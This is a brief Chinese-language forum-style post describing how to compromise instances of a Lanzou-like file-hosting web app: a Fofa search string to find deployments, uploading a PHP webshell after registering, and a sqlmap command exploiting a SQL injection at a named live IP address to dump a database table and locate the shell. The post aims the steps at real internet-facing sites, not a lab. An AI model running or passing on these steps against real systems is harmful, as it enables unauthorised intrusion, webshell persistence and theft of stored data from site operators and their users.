逆天 看了多逛逛安全论坛还是有很多有意思的东西的😄

Fofa:`"assets/picture/header-mobile.png"`

注册登录 然后传一个php shell
![img](仿蓝奏网盘(城通)sql注入+文件上传getshell/images/image.png)

接下来就是找路径 应该是能得到源码然后审计
这里有sql注入漏洞
`http://42.48.249.206:8009/file/list?&folder_id=0&search=&rows=20&page=1`

带上cookie sqlmap一把梭
`sqlmap -r post.txt --batch -D pan -T  sk_stores --dump`

这样就能找到我们上传的php shell的路径 
(由于找的这云盘数据太多 懒得爆了...)
